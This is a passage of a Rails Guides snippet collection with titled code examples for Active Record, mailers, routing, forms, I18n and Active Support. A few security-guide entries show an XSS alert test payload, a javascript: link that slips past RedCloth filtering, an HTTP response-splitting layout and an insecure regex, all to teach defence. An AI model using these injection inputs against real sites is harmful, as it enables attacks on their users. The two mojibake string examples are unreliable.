  sql: "SELECT \"posts\".* FROM \"posts\" ",
  name: "Post Load",
  binds: [<ActiveModel::Attribute::WithCastValue:0x00007fe19d15dc00>],
  type_casted_binds: [11],
  async: false,
  allow_retry: true,
  connection: <ActiveRecord::ConnectionAdapters::SQLite3Adapter:0x00007f9f7a838850>,
  transaction: <ActiveRecord::ConnectionAdapters::RealTransaction:0x0000000121b5d3e0>
  affected_rows: 0
  row_count: 5,
  statement_name: nil,
}

----------------------------------------

TITLE: Defining Translations for Email Subjects
DESCRIPTION: Shows how to define translations for email subjects in YAML configuration files using the pattern <mailer_scope>.<action_name>.subject.

LANGUAGE: yaml
CODE:
en:
  user_mailer:
    welcome:
      subject: "Welcome to Rails Guides!"

----------------------------------------

TITLE: Using Pathname#existence for Conditional File Reading
DESCRIPTION: Demonstrates the ActiveSupport extension to Pathname that adds the existence method. This method returns the pathname if the file exists, or nil if it doesn't, allowing for safe conditional operations with the safe navigation operator.

LANGUAGE: ruby
CODE:
content = Pathname.new("file").existence&.read

----------------------------------------

TITLE: Updating Action Cable Debugging Configuration
DESCRIPTION: Diff showing the changes needed for enabling/disabling debugging in Action Cable JavaScript API, as the methods startDebugging and stopDebugging have been replaced with the property ActionCable.logger.enabled.

LANGUAGE: diff
CODE:
-    ActionCable.startDebugging()
+    ActionCable.logger.enabled = true

LANGUAGE: diff
CODE:
-    ActionCable.stopDebugging()
+    ActionCable.logger.enabled = false

----------------------------------------

TITLE: Adding File Attachments to Rails Mailers
DESCRIPTION: Ruby code showing how to add file attachments to an email in Action Mailer. The system automatically detects MIME type and handles encoding for the attachment.

LANGUAGE: ruby
CODE:
attachments["filename.jpg"] = File.read("/path/to/filename.jpg")

----------------------------------------

TITLE: Using parameterize with custom separator in Ruby on Rails
DESCRIPTION: Examples showing how to use a custom separator with parameterize instead of the default dash character.

LANGUAGE: ruby
CODE:
"John Smith".parameterize(separator: "_") # => "john_smith"
"Kurt GÃ¶del".parameterize(separator: "_") # => "kurt_godel"

----------------------------------------

TITLE: Streaming from a Channel with Parameters in Ruby
DESCRIPTION: Subscribes to a broadcasting based on a parameter using stream_from in a ChatChannel class. This enables routing messages to specific chat rooms based on the room parameter.

LANGUAGE: ruby
CODE:
# app/channels/chat_channel.rb
class ChatChannel < ApplicationCable::Channel
  def subscribed
    stream_from "chat_#{params[:room]}"
  end
end

----------------------------------------

TITLE: Defining Article Model with Custom Primary Key in Rails
DESCRIPTION: Creates an Article model that inherits from ApplicationRecord with a custom primary key and an archive method that marks articles as archived.

LANGUAGE: ruby
CODE:
# app/models/article.rb
class Article < ApplicationRecord
  self.primary_key = "id"
  def archive!
    update_attribute :archived, true
  end
end

----------------------------------------

TITLE: Using Autoloaded Classes in Initializers
DESCRIPTION: Example showing how classes from autoload_once_paths can be used in initializers, such as registering a custom serializer with Active Job.

LANGUAGE: ruby
CODE:
# config/initializers/custom_serializers.rb
Rails.application.config.active_job.custom_serializers << MoneySerializer

----------------------------------------

TITLE: Generated HTML for Multiple Submit Buttons with Different Methods
DESCRIPTION: Shows the HTML output for a form with multiple submit buttons that trigger different HTTP methods. Rails emulates non-POST methods using a combination of attributes.

LANGUAGE: html
CODE:
<form accept-charset="UTF-8" action="/posts/1" method="post">
  <input name="_method" type="hidden" value="patch" />
  <input name="authenticity_token" type="hidden" value="f755bb0ed134b76c432144748a6d4b7a7ddf2b71" />
  <!-- ... -->

  <button type="submit" formmethod="post" name="_method" value="delete" data-confirm="Are you sure?">Delete</button>
  <button type="submit" name="button">Update</button>
</form>

----------------------------------------

TITLE: Creating Parameterized Direct Routes in Rails
DESCRIPTION: Demonstrates creating a direct route that accepts parameters. The block can use these parameters to generate dynamic URLs or routing options.

LANGUAGE: ruby
CODE:
direct :commentable do |model|
  [ model, anchor: model.dom_id ]
end

----------------------------------------

TITLE: Demonstrating HTTP Response Splitting Attack Pattern
DESCRIPTION: This example shows the HTTP response structure that could result from a successful response splitting attack, where an attacker injects CRLFs to create a second malicious response.

LANGUAGE: http
CODE:
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location:Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitrary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html

----------------------------------------

TITLE: Incorrect Regular Expression for URL Validation in Ruby
DESCRIPTION: Demonstrates an insecure regular expression pattern for URL validation using ^ and $ anchors, which in Ruby only match line beginnings and endings rather than string boundaries.

LANGUAGE: ruby
CODE:
/^https?:\/\/[^\n]+$/i

----------------------------------------

TITLE: Custom Named Route Definition
DESCRIPTION: Shows how to create a route with a custom name using the as: option, which generates helper methods for paths and URLs.

LANGUAGE: ruby
CODE:
get "/users/:id", to: "users#show", as: "user"

----------------------------------------

TITLE: HTML Output for Destroy Checkbox
DESCRIPTION: Shows the HTML generated for the _destroy checkbox in a nested form. When submitted with a value of 1, Rails will destroy the associated record.

LANGUAGE: html
CODE:
<input type="checkbox" value="1" name="person[addresses_attributes][0][_destroy]" id="person_addresses_attributes_0__destroy">

----------------------------------------

TITLE: Word Truncation with Custom Omission in Ruby
DESCRIPTION: Shows customizing the omission string when truncating by words using the :omission option.

LANGUAGE: ruby
CODE:
"Oh dear! Oh dear! I shall be late!".truncate_words(4, omission: "&hellip;")
# => "Oh dear! Oh dear!&hellip;"

----------------------------------------

TITLE: Using date_select Helper with Model Object in Rails ERB
DESCRIPTION: This snippet demonstrates how to use the date_select helper to render select boxes for year, month, and day, bound to a model's date attribute.

LANGUAGE: erb
CODE:
<%= form_with model: @person do |form| %>
  <%= form.date_select :birth_date %>
<% end %>

----------------------------------------

TITLE: Apache Configuration for Far-future Expires Headers
DESCRIPTION: Apache server configuration to add far-future expires headers to precompiled assets. This maximizes browser caching benefits by telling browsers to cache the assets for a full year.

LANGUAGE: apache
CODE:
# The Expires* directives requires the Apache module
# `mod_expires` to be enabled.
<Location /assets/>
  # Use of ETag is discouraged when Last-Modified is present
  Header unset ETag
  FileETag None
  # RFC says only cache for 1 year
  ExpiresActive On
  ExpiresDefault "access plus 1 year"
</Location>

----------------------------------------

TITLE: Using yield with Partials in Rails Views
DESCRIPTION: Demonstrates an advanced technique of using yield with partials to create reusable form layouts across different resources in a Rails application.

LANGUAGE: html+erb
CODE:
<%= render "application/search_filters", search: @q do |form| %>
  <p>
    Name contains: <%= form.text_field :name_contains %>
  </p>
<% end %>

LANGUAGE: html+erb
CODE:
<%= render "application/search_filters", search: @q do |form| %>
  <p>
    Title contains: <%= form.text_field :title_contains %>
  </p>
<% end %>

LANGUAGE: html+erb
CODE:
<%= form_with model: search do |form| %>
  <h1>Search form:</h1>
  <fieldset>
    <%= yield form %>
  </fieldset>
  <p>
    <%= form.submit "Search" %>
  </p>
<% end %>

----------------------------------------

TITLE: Adding Inventory Count Field to Product Form
DESCRIPTION: Demonstrates how to add a numeric input field for inventory count to the product form. This allows administrators to update the stock level of products.

LANGUAGE: erb
CODE:
<div>
  <%= form.label :inventory_count, style: "display: block" %>
  <%= form.number_field :inventory_count %>
</div>

----------------------------------------

TITLE: Configuring Autoload Once Paths
DESCRIPTION: Shows how to configure classes and modules to be autoloaded but not reloaded, by adding directories to config.autoload_once_paths.

LANGUAGE: ruby
CODE:
module MyApplication
  class Application < Rails::Application
    config.autoload_once_paths << "#{root}/app/serializers"
  end
end

----------------------------------------

TITLE: Using Rails Command-Line Interface in Rails 3
DESCRIPTION: Demonstrates the new unified rails command that replaces the various script/* files from previous Rails versions. Shows examples of running the console and generating a scaffold.

LANGUAGE: bash
CODE:
$ rails console                      # instead of script/console
$ rails g scaffold post title:string # instead of script/generate scaffold post title:string

----------------------------------------

TITLE: Enqueuing a Job with Custom Priority in Rails
DESCRIPTION: Demonstrates how to set a custom priority when enqueuing a job using the set method with a priority option.

LANGUAGE: ruby
CODE:
MyJob.set(priority: 50).perform_later(record)

----------------------------------------

TITLE: Using after_all_transactions_commit for Universal Transaction Handling
DESCRIPTION: Example of using the new after_all_transactions_commit method to schedule work after all transactions have been committed, which works regardless of whether the code is inside or outside a transaction.

LANGUAGE: ruby
CODE:
def publish_article(article)
  article.update(published: true)

  ActiveRecord.after_all_transactions_commit do
    PublishNotificationMailer.with(article: article).deliver_later
  end
end

----------------------------------------

TITLE: Duration Handling Calendar Reform with DateTime in Ruby
DESCRIPTION: Duration objects properly handle calendar reforms when performing calculations, such as the transition from Julian to Gregorian calendar.

LANGUAGE: ruby
CODE:
DateTime.new(1582, 10, 4, 23) + 1.hour
# => Fri, 15 Oct 1582 00:00:00 +0000

----------------------------------------

TITLE: Creating Validations with Internationalized Error Messages
DESCRIPTION: Shows how to create a validation that will use the internationalized error messages lookup system in Rails.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  validates :name, presence: true
end

----------------------------------------

TITLE: Namespaced Controller Definition in a Rails Engine
DESCRIPTION: Example of how a controller is namespaced within a Rails engine. The ArticlesController is defined within the Blorgh module and inherits from the engine's ApplicationController.

LANGUAGE: ruby
CODE:
module Blorgh
  class ArticlesController < ApplicationController
    # ...
  end
end

----------------------------------------

TITLE: Custom to_param Example for to_query
DESCRIPTION: Shows a custom to_param implementation that will be used in the to_query examples that follow.

LANGUAGE: ruby
CODE:
class User
  def to_param
    "#{id}-#{name.parameterize}"
  end
end

----------------------------------------

TITLE: Checking if has_many Collection is Empty in Rails
DESCRIPTION: Example of using the empty? method to check if a collection contains any associated objects. This can be used in conditional views to display appropriate content.

LANGUAGE: erb
CODE:
<% if @author.books.empty? %>
  No Books Found
<% end %>

----------------------------------------

TITLE: Using beginning_of_hour and end_of_hour with DateTime objects in Ruby on Rails
DESCRIPTION: These methods return timestamps at the beginning (hh:00:00) and end (hh:59:59) of the hour. The beginning_of_hour method has an alias at_beginning_of_hour.

LANGUAGE: ruby
CODE:
date = DateTime.new(2010, 6, 7, 19, 55, 25)
date.beginning_of_hour # => Mon Jun 07 19:00:00 +0200 2010

LANGUAGE: ruby
CODE:
date = DateTime.new(2010, 6, 7, 19, 55, 25)
date.end_of_hour # => Mon Jun 07 19:59:59 +0200 2010

----------------------------------------

TITLE: Conditional Layout Declaration in Rails Controller
DESCRIPTION: Example of using :except option with layout declaration to exclude specific controller actions from using the specified layout.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  layout "product", except: [:index, :rss]
end

----------------------------------------

TITLE: Demonstrating Context Merging in Rails Error Reporter
DESCRIPTION: Example showing how context set globally is merged with context provided in individual error handling calls. Each error report includes both the global and call-specific context.

LANGUAGE: ruby
CODE:
Rails.error.set_context(a: 1)
Rails.error.handle(context: { b: 2 }) { raise }
# The reported context will be: {:a=>1, :b=>2}
Rails.error.handle(context: { b: 3 }) { raise }
# The reported context will be: {:a=>1, :b=>3}

----------------------------------------

TITLE: Using extract_options! in Ruby on Rails Array extensions
DESCRIPTION: The extract_options! method checks if the last item of an array is a hash. If it is, it pops and returns it; otherwise, it returns an empty hash. This is particularly useful for methods that handle variable arguments with trailing options. Defined in active_support/core_ext/array/extract_options.rb.

LANGUAGE: ruby
CODE:
def caches_action(*actions)
  return unless cache_configured?
  options = actions.extract_options!
  # ...
end

----------------------------------------

TITLE: Creating Hash with Indifferent Access in Rails
DESCRIPTION: The with_indifferent_access method returns an ActiveSupport::HashWithIndifferentAccess version of the hash, allowing access to keys using either strings or symbols.

LANGUAGE: ruby
CODE:
{ a: 1 }.with_indifferent_access["a"] # => 1

----------------------------------------

TITLE: Proper Article Usage with SQL in Documentation
DESCRIPTION: Shows the correct article usage when referring to SQL in documentation, using 'an' instead of 'a'.

LANGUAGE: ruby
CODE:
# BAD
# Creates a SQL statement.
# Starts a SQLite database.

# GOOD
# Creates an SQL statement.
# Starts an SQLite database.

----------------------------------------

TITLE: Rails Console Prompt Example
DESCRIPTION: Sample output showing the Rails console prompt after launching the console. Displays the Rails version and environment being used.

LANGUAGE: irb
CODE:
Loading development environment (Rails 8.1.0)
store(dev)>

----------------------------------------

TITLE: Creating Link to Single Resource Object in Rails
DESCRIPTION: Demonstrates creating a link to a single resource object. When a single model instance is provided, Rails generates a path to that resource.

LANGUAGE: erb
CODE:
<%= link_to 'Magazine details', @magazine %>

----------------------------------------

TITLE: RedCloth HTML Filtering Limitation with Anchor Tags
DESCRIPTION: Demonstration of RedCloth's filtering limitation where anchor tags with javascript: URIs are not filtered out even when using the :filter_html option.

LANGUAGE: ruby
CODE:
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href=\"javascript:alert(1)\">hello</a></p>"

----------------------------------------

TITLE: Case-Insensitive Deterministic Encryption with Downcasing
DESCRIPTION: Example of using the downcase option when encrypting attributes to enable case-insensitive queries while storing data in lowercase.

LANGUAGE: ruby
CODE:
class Person
  encrypts :email_address, deterministic: true, downcase: true
end

----------------------------------------

TITLE: Running Rails Commands with rails_command Method
DESCRIPTION: Examples of running Rails commands within the application using the rails_command method, with options for specifying environment, super-user execution, and failure handling.

LANGUAGE: ruby
CODE:
rails_command "db:migrate"

LANGUAGE: ruby
CODE:
rails_command "db:migrate", env: "production"

LANGUAGE: ruby
CODE:
rails_command "log:clear", sudo: true

LANGUAGE: ruby
CODE:
rails_command "db:migrate", abort_on_failure: true

----------------------------------------

TITLE: Using Asset Path Helper in ERB Templates
DESCRIPTION: Demonstrates how to use the asset_path helper in ERB templates to generate URLs for assets. When a CDN is configured, this helper will generate full CDN URLs.

LANGUAGE: erb
CODE:
<%= asset_path('smile.png') %>

----------------------------------------

TITLE: Creating Select Boxes with a Preselected Option
DESCRIPTION: Demonstrates creating a select box with a specific option preselected using the selected parameter. This is useful when editing existing records or setting default values.

LANGUAGE: erb
CODE:
<%= form.select :city, [["Berlin", "BE"], ["Chicago", "CHI"], ["Madrid", "MD"]], selected: "CHI" %>

----------------------------------------

TITLE: Using View Variants in Rails Render
DESCRIPTION: Example of rendering view variants which allows different templates for the same action based on criteria like device type. This example shows specifying variants directly in the render call.

LANGUAGE: ruby
CODE:
# called in HomeController#index
render variants: [:mobile, :desktop]

----------------------------------------

TITLE: Using Layouts with Collection Partials in Rails
DESCRIPTION: Shows how to apply a layout to each item in a collection of partials using the :layout option.

LANGUAGE: erb
CODE:
<%= render partial: "product", collection: @products, layout: "special_layout" %>

----------------------------------------

TITLE: Adding has_many Association to Product Model in Rails
DESCRIPTION: Code to add a has_many relationship to subscribers in the Product model with dependent destroy option.

LANGUAGE: ruby
CODE:
class Product < ApplicationRecord
  has_many :subscribers, dependent: :destroy
  has_one_attached :featured_image
  has_rich_text :description

  validates :name, presence: true
  validates :inventory_count, numericality: { greater_than_or_equal_to: 0 }
end

----------------------------------------

TITLE: Using bulk schema changes with change_table in migrations
DESCRIPTION: Demonstrates how to use the new :bulk option with change_table to make all schema changes defined in a block using a single ALTER statement for better performance.

LANGUAGE: ruby
CODE:
change_table(:users, :bulk => true) do |t|
  t.string :company_name
  t.change :birthdate, :datetime
end

----------------------------------------

TITLE: Configuring Browser Version Requirements in Rails Controllers
DESCRIPTION: This snippet demonstrates how to manually specify browser version requirements in a Rails controller. It allows defining specific version thresholds for different browsers, with the option to completely block others.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  # All versions of Chrome and Opera will be allowed, but no versions of "internet explorer" (ie). Safari needs to be 16.4+ and Firefox 121+.
  allow_browser versions: { safari: 16.4, firefox: 121, ie: false }
end

----------------------------------------

TITLE: Documenting Boolean Configuration Options
DESCRIPTION: Shows how to document boolean configuration options by focusing on semantics rather than specific values.

LANGUAGE: ruby
CODE:
# +config.action_mailer.perform_deliveries+ specifies whether mail
# will actually be delivered and is true by default

----------------------------------------

TITLE: Cache Fetch Hit Example Payload in Active Support
DESCRIPTION: Example of the payload data available during a cache_fetch_hit.active_support event. This shows the cache key and store class name.

LANGUAGE: ruby
CODE:
{
  key: "name-of-complicated-computation",
  store: "ActiveSupport::Cache::MemCacheStore"
}

----------------------------------------

TITLE: Defining Association Scopes with where Conditions in Rails
DESCRIPTION: Shows how to specify common queries as scopes on associations using the where method. This example filters assemblies to only include active ones when accessed through the Parts model.

LANGUAGE: ruby
CODE:
class Parts < ApplicationRecord
  has_and_belongs_to_many :assemblies, -> { where active: true }
end

----------------------------------------

TITLE: Controller Test with Basic Authentication
DESCRIPTION: Shows how to include basic authentication credentials in a controller test request.

LANGUAGE: ruby
CODE:
post articles_url, params: { article: { body: "Rails is awesome!", title: "Hello Rails" } }, headers: { Authorization: ActionController::HttpAuthentication::Basic.encode_credentials("dhh", "secret") }

----------------------------------------

TITLE: Creating Resource Routes in Rails
DESCRIPTION: Adding resource routes for a Book model in the Rails routes file, which automatically creates RESTful routes for index, show, new, create, edit, update, and destroy actions.

LANGUAGE: ruby
CODE:
resources :books

----------------------------------------

TITLE: Custom Omission in Byte Truncation in Ruby
DESCRIPTION: Shows customizing the omission string when truncating by bytes using the :omission option.

LANGUAGE: ruby
CODE:
"ðððð".truncate_bytes(15, omission: "ð")
# => "ððð"

----------------------------------------

TITLE: Generated Add Column Migration in Ruby on Rails
DESCRIPTION: This migration, generated from the AddPartNumberToProducts command, adds a part_number string column to the products table.

LANGUAGE: ruby
CODE:
class AddPartNumberToProducts < ActiveRecord::Migration[8.1]
  def change
    add_column :products, :part_number, :string
  end
end

----------------------------------------

TITLE: Configuring SQLite3 Database in Rails
DESCRIPTION: This configuration demonstrates the basic setup for an SQLite3 database in the development environment. It sets the database adapter, file location, connection pool size, and timeout settings.

LANGUAGE: yaml
CODE:
development:
  adapter: sqlite3
  database: storage/development.sqlite3
  pool: 5
  timeout: 5000

----------------------------------------

TITLE: Defining a Basic Rails Controller Class
DESCRIPTION: A minimal BooksController class definition that demonstrates Rails' convention over configuration approach to routing and rendering views.

LANGUAGE: ruby
CODE:
class BooksController < ApplicationController
end

----------------------------------------

TITLE: Live Streaming Arbitrary Data with ActionController::Live
DESCRIPTION: Demonstrates how to create a persistent connection with a browser using ActionController::Live. The example sends 100 messages to the client at one-second intervals.

LANGUAGE: ruby
CODE:
class MyController < ActionController::Base
  include ActionController::Live

  def stream
    response.headers["Content-Type"] = "text/event-stream"
    100.times {
      response.stream.write "hello world\n"
      sleep 1
    }
  ensure
    response.stream.close
  end
end

----------------------------------------

TITLE: Edge Cases with prev_month and next_month in Ruby
DESCRIPTION: Examples showing how prev_month and next_month handle edge cases like month-end dates and leap years.

LANGUAGE: ruby
CODE:
Time.new(2000, 5, 31).prev_month # => 2000-04-30 00:00:00 +0900
Time.new(2000, 3, 31).prev_month # => 2000-02-29 00:00:00 +0900
Time.new(2000, 5, 31).next_month # => 2000-06-30 00:00:00 +0900
Time.new(2000, 1, 31).next_month # => 2000-02-29 00:00:00 +0900

----------------------------------------

TITLE: Multiple Partial Compilations Based on local Parameters
DESCRIPTION: Illustrates how different combinations of locals passed to a partial can cause multiple compilations of the same partial, showing the Ruby methods generated under the hood.

LANGUAGE: html+erb
CODE:
<%# app/views/articles/show.html.erb %>
<%= render partial: "article", layout: "box", locals: { article: @article } %>
<%= render partial: "article", layout: "box", locals: { article: @article, theme: "dark" } %>

LANGUAGE: ruby
CODE:
def _render_template_2323231_article_show(buffer, local_assigns, article:)
  # ...
end

def _render_template_3243454_article_show(buffer, local_assigns, article:, theme:)
  # ...
end

----------------------------------------

TITLE: Testing Routes with assert_generates in Rails
DESCRIPTION: Shows how to use the assert_generates assertion to verify that a particular set of options generates the expected path. This can be used with both default and custom routes.

LANGUAGE: ruby
CODE:
assert_generates "/photos/1", { controller: "photos", action: "show", id: "1" }
assert_generates "/about", controller: "pages", action: "about"

----------------------------------------

TITLE: Configuring a Chain Backend for I18n
DESCRIPTION: Example of replacing the default Simple backend with a Chain backend that combines an Active Record backend with the Simple backend. Useful for storing custom translations in a database.

LANGUAGE: ruby
CODE:
I18n.backend = I18n::Backend::Chain.new(I18n::Backend::ActiveRecord.new, I18n.backend)

----------------------------------------

TITLE: Writing Tests for Instance Method Functionality
DESCRIPTION: Test cases that verify the instance methods added by the acts_as_yaffle functionality. This tests that models get a squawk method that updates the configured field.

LANGUAGE: ruby
CODE:
# yaffle/test/acts_as_yaffle_test.rb
require "test_helper"

class ActsAsYaffleTest < ActiveSupport::TestCase
  def test_a_hickwalls_yaffle_text_field_should_be_last_squawk
    assert_equal "last_squawk", Hickwall.yaffle_text_field
  end

  def test_a_wickwalls_yaffle_text_field_should_be_last_tweet
    assert_equal "last_tweet", Wickwall.yaffle_text_field
  end

  def test_hickwalls_squawk_should_populate_last_squawk
    hickwall = Hickwall.new
    hickwall.squawk("Hello World")
    assert_equal "squawk! Hello World", hickwall.last_squawk
  end

  def test_wickwalls_squawk_should_populate_last_tweet
    wickwall = Wickwall.new
    wickwall.squawk("Hello World")
    assert_equal "squawk! Hello World", wickwall.last_tweet
  end
end

----------------------------------------

TITLE: Basic XSS Test Using Alert in HTML Script Tag
DESCRIPTION: The most straightforward test to check for XSS vulnerabilities by using JavaScript to display an alert box. This simple code is used to determine if a website properly sanitizes user input.

LANGUAGE: html
CODE:
<script>alert('Hello');</script>

----------------------------------------

TITLE: Using Multiline Option with Line-Based Regex in Rails Validation
DESCRIPTION: Shows how to use the multiline option in Rails validation when you specifically need line-based anchors (^ and $) instead of string-based anchors.

LANGUAGE: ruby
CODE:
# content should include a line "Meanwhile" anywhere in the string
validates :content, format: { with: /^Meanwhile$/, multiline: true }

----------------------------------------

TITLE: Configuring JPEG Compression with Vips in Active Storage
DESCRIPTION: Updates JPEG image compression settings from ImageMagick style to libvips style using the saver parameter with appropriate options.

LANGUAGE: ruby
CODE:
- variant(strip: true, quality: 80, interlace: "JPEG", sampling_factor: "4:2:0", colorspace: "sRGB")
+ variant(saver: { strip: true, quality: 80, interlace: true })

----------------------------------------

TITLE: Running Active Record Tests for MySQL2
DESCRIPTION: Shows how to run the Active Record test suite specifically for the MySQL2 adapter. This requires that the MySQL database has been previously set up.

LANGUAGE: bash
CODE:
$ bundle exec rake test:mysql2

----------------------------------------

TITLE: Configuring Production Environment for Asset Pipeline
DESCRIPTION: Sets up production environment settings for the asset pipeline, including compression, compilation, and digests. Also includes commented options for SSL and additional asset precompilation.

LANGUAGE: ruby
CODE:
# Compress JavaScripts and CSS
config.assets.compress = true

# Don't fallback to assets pipeline if a precompiled asset is missed
config.assets.compile = false

# Generate digests for assets URLs
config.assets.digest = true

# Defaults to Rails.root.join("public/assets")
# config.assets.manifest = YOUR_PATH

# Precompile additional assets (application.js, application.css, and all non-JS/CSS are already added)
# config.assets.precompile += %w( admin.js admin.css )

# Force all access to the app over SSL, use Strict-Transport-Security, and use secure cookies.
# config.force_ssl = true

----------------------------------------

TITLE: Rendering JavaScript Response
DESCRIPTION: Sending vanilla JavaScript as a response with text/javascript MIME type using the :js option to render, which can be executed by the browser.

LANGUAGE: ruby
CODE:
render js: "alert('Hello Rails');"

----------------------------------------

TITLE: Defining Models with Associations in a Shared Module
DESCRIPTION: Demonstrates how to define Active Record models with associations inside a module, which keeps the associations properly scoped to that module.

LANGUAGE: ruby
CODE:
module MyApplication
  module Business
    class Supplier < ApplicationRecord
      has_one :account
    end

    class Account < ApplicationRecord
      belongs_to :supplier
    end
  end
end

----------------------------------------

TITLE: Implementing String Core Extension
DESCRIPTION: Implementation of the 'to_squawk' method that extends the String class. This demonstrates how to add functionality to Ruby core classes through a Rails plugin.

LANGUAGE: ruby
CODE:
# yaffle/lib/yaffle/core_ext.rb

class String
  def to_squawk
    "squawk! #{self}".strip
  end
end

----------------------------------------

TITLE: Updating Product Show View with CSS Classes
DESCRIPTION: Updates the product show view to use the new CSS styles, creating a responsive layout for product details. Adds sections with appropriate class names for styling.

LANGUAGE: erb
CODE:
<p><%= link_to "Back", products_path %></p>

<section class="product">
  <%= image_tag @product.featured_image if @product.featured_image.attached? %>

  <section class="product-info">
    <% cache @product do %>
      <h1><%= @product.name %></h1>
      <%= @product.description %>
    <% end %>

    <%= render "inventory", product: @product %>

    <% if authenticated? %>
      <%= link_to "Edit", edit_product_path(@product) %>
      <%= button_to "Delete", @product, method: :delete, data: { turbo_confirm: "Are you sure?" } %>
    <% end %>
  </section>
</section>

----------------------------------------

TITLE: Including JavaScript Files with javascript_include_tag in Rails
DESCRIPTION: Demonstrates how to use the javascript_include_tag helper to link to JavaScript files from various locations. The helper generates script tags that are processed by the Asset Pipeline.

LANGUAGE: erb
CODE:
<%= javascript_include_tag "main" %>

LANGUAGE: html
CODE:
<script src='/assets/main.js'></script>

LANGUAGE: erb
CODE:
<%= javascript_include_tag "main", "columns" %>

LANGUAGE: erb
CODE:
<%= javascript_include_tag "main", "/photos/columns" %>

LANGUAGE: erb
CODE:
<%= javascript_include_tag "http://example.com/main.js" %>

----------------------------------------

TITLE: Setting Custom Queue for a Job in Rails
DESCRIPTION: Shows how to specify a custom queue when enqueuing a job by using the set method with a queue option.

LANGUAGE: ruby
CODE:
MyJob.set(queue: :another_queue).perform_later(record)

----------------------------------------

TITLE: Configuration Options for ActiveRecord in Rails
DESCRIPTION: This document doesn't contain executable code snippets, but rather describes configuration options that would be used in Rails configuration files like config/application.rb or environment-specific files. The document details ActiveRecord configuration parameters and their default values across different Rails versions.

LANGUAGE: markdown
CODE:
#### `config.active_record.partial_updates`

Is a boolean value and controls whether or not partial writes are used when updating existing records (i.e. whether updates only set attributes that are dirty). Note that when using partial updates, you should also use optimistic locking `config.active_record.lock_optimistically` since concurrent updates may write attributes based on a possibly stale read state. The default value is `true`.

----------------------------------------

TITLE: Subscribing to Events Using a Block with Single Event Argument in Ruby
DESCRIPTION: This snippet demonstrates how to subscribe to the 'process_action.action_controller' event using ActiveSupport::Notifications.subscribe with a block that takes a single event argument. The event object provides access to name, duration, allocations, and payload data.

LANGUAGE: ruby
CODE:
ActiveSupport::Notifications.subscribe "process_action.action_controller" do |event|
  event.name        # => "process_action.action_controller"
  event.duration    # => 10 (in milliseconds)
  event.allocations # => 1826
  event.payload     # => {:extra=>information}

  Rails.logger.info "#{event} Received!"
end

----------------------------------------

TITLE: Clearing Validation Errors with errors.clear
DESCRIPTION: This example demonstrates how to clear validation errors using the errors.clear method. It shows that clearing errors doesn't make an invalid object valid, as validations will run again on the next validation check.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.valid?
=> false
irb> person.errors.empty?
=> false

irb> person.errors.clear
irb> person.errors.empty?
=> true

irb> person.save
=> false

irb> person.errors.empty?
=> false

----------------------------------------

TITLE: Handling Missing Attribute Error in ActiveRecord
DESCRIPTION: Shows the error message that occurs when attempting to access an attribute that wasn't included in a select statement.

LANGUAGE: plaintext
CODE:
ActiveModel::MissingAttributeError: missing attribute '<attribute>' for Book

----------------------------------------

TITLE: Creating Text Email Template for In-Stock Notifications
DESCRIPTION: Plain text email template for product back-in-stock notifications.

LANGUAGE: erb
CODE:
Good news!

<%= @product.name %> is back in stock.
<%= product_url(@product) %>

----------------------------------------

TITLE: Truncating Strings by Word Count in Ruby
DESCRIPTION: Demonstrates truncating strings based on word count rather than character count using truncate_words.

LANGUAGE: ruby
CODE:
"Oh dear! Oh dear! I shall be late!".truncate_words(4)
# => "Oh dear! Oh dear!..."

----------------------------------------

TITLE: Adding HTML Links to Product Show Pages
DESCRIPTION: Updates the products index view to include HTML anchor tags that link to each product's show page using the product's ID in the URL.

LANGUAGE: erb
CODE:
<h1>Products</h1>

<div id="products">
  <% @products.each do |product| %>
    <div>
      <a href="/products/<%= product.id %>">
        <%= product.name %>
      </a>
    </div>
  <% end %>
</div>

----------------------------------------

TITLE: Using presence Method in Ruby on Rails
DESCRIPTION: Example of using the presence method which returns its receiver if present?, and nil otherwise, useful for providing default values.

LANGUAGE: ruby
CODE:
host = config[:host].presence || "localhost"

----------------------------------------

TITLE: Zeroing Minutes in DateTime with Ruby
DESCRIPTION: When zeroing minutes with the change method, seconds are automatically zeroed too unless explicitly specified.

LANGUAGE: ruby
CODE:
now.change(min: 0)
# => Tue, 08 Jun 2010 01:00:00 +0000

----------------------------------------

TITLE: Registering Custom MIME Types in Rails
DESCRIPTION: Shows how to register additional MIME types in Rails initializers. The example registers the Rich Text Format (RTF) to be used with respond_to functionality.

LANGUAGE: ruby
CODE:
Mime::Type.register("application/rtf", :rtf)

----------------------------------------

TITLE: Generating Models in an Engine
DESCRIPTION: Command for generating a new model within the context of an engine using the Rails generator.

LANGUAGE: bash
CODE:
$ bin/rails generate model

----------------------------------------

TITLE: Using I18n Translation Aliases in Ruby
DESCRIPTION: Shows how to use the shorthand aliases for the I18n methods - t for translate and l for localize - with practical examples of translating a string and localizing a time object.

LANGUAGE: ruby
CODE:
I18n.t "store.title"
I18n.l Time.now

----------------------------------------

TITLE: Running Rails commands with Spring preloader in Bash
DESCRIPTION: Examples of how to use springified binstubs to run Rails commands with the Spring application preloader, which speeds up development by keeping the application running in the background.

LANGUAGE: bash
CODE:
$ bin/rake test:models

LANGUAGE: bash
CODE:
$ bin/rails console

LANGUAGE: bash
CODE:
$ bin/spring status
Spring is running:

 1182 spring server | my_app | started 29 mins ago
 3656 spring app    | my_app | started 23 secs ago | test mode
 3746 spring app    | my_app | started 10 secs ago | development mode

----------------------------------------

TITLE: Adding before_remove_const Callback in Ruby
DESCRIPTION: Implemented a 'before_remove_const' callback to the remove_unloadable_constants! method in ActiveSupport::Dependencies, allowing for actions to be performed before constants are removed.

LANGUAGE: ruby
CODE:
before_remove_const

----------------------------------------

TITLE: Writing Tests for Class Method Functionality
DESCRIPTION: Test cases that verify the class methods added by the acts_as_yaffle functionality. This tests that models can configure which field is used for the yaffle text.

LANGUAGE: ruby
CODE:
